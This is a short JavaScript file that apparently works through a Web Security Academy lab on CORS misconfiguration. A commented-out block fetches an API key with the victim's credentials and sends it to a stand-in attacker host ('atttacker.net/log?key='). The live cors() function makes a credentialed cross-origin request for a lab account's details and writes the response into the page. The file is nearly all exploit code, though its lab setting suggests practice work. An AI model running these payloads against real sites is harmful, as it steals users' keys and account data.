/*var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://btc-exchange/api/requestApiKey',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText;
};
*/

function cors() {
  alert("Okayeg");
        document.getElementById('report').innerHTML = "this.responseText";
  var xhr = new XMLHttpRequest();
  xhr.onload = function() {
      document.getElementById('report').innerHTML = this.responseText;
  }
  xhr.open("GET", "https://0ae900ed03354629c0fd4c1900870036.web-security-academy.net/accountDetails", true);
  xhr.withCredentials = true;
  xhr.send();
}
